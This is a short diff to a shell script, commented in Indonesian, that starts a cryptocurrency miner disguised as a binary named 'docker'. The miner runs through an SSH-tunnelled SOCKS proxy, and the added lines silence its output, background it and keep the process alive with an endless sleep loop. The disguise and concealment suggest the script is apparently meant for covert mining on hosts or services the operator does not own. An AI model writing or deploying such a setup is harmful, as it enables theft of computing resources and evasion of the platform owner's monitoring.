@@ -18,4 +18,11 @@ sleep 7
 echo "Menjalankan miner melalui Tunnel..."
 
 # Jalankan miner menggunakan proxy lokal (127.0.0.1) yang dibuat oleh SSH
-./docker -c docker.json --proxy="socks5://127.0.0.1:1080"
+./docker -c docker.json --proxy="socks5://127.0.0.1:1080" >/dev/null 2>&1 &
+
+echo "Running..."
+
+while true
+do
+  sleep 60
+done
